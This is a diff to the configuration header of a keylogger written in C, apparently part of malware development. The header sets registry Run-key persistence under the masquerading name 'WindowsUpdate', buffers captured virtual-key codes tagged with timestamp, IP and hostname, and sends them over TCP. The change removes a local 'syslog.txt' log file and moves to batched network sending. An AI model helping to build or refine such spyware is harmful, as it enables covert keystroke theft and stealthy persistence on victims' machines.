@@ -17,10 +17,6 @@
     #error "Unsupported architecture. Build for x86, x64, or ARM64."
 #endif
 
-// Log file name (will be placed in user's temp directory)
-// The actual path is constructed dynamically using GetTempPathA()
-#define LOG_FILE_NAME "syslog.txt"
-
 // Registry persistence configuration
 #define REGISTRY_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 #define REGISTRY_VALUE_NAME "WindowsUpdate"
@@ -49,9 +45,9 @@
 // Ring buffer
 #define RING_BUFFER_CAPACITY    2048
 
-// Approximate formatted message size for flush threshold calculation
-// "YYYY-MM-DD HH:MM:SS|xxx.xxx.xxx.xxx|HOSTNAME|VK=0xXX\n" ~ 60 bytes
-#define APPROX_MSG_SIZE         60
+// Approximate per-entry size for flush threshold calculation
+// Batched format: "timestamp|ip|hostname|0xXX,0xYY,...\n", ~5 bytes per entry
+#define APPROX_MSG_SIZE         5
 #define FLUSH_COUNT_THRESHOLD   (SEND_BUFFER_MAX / APPROX_MSG_SIZE)
 
 // TCP Keepalive
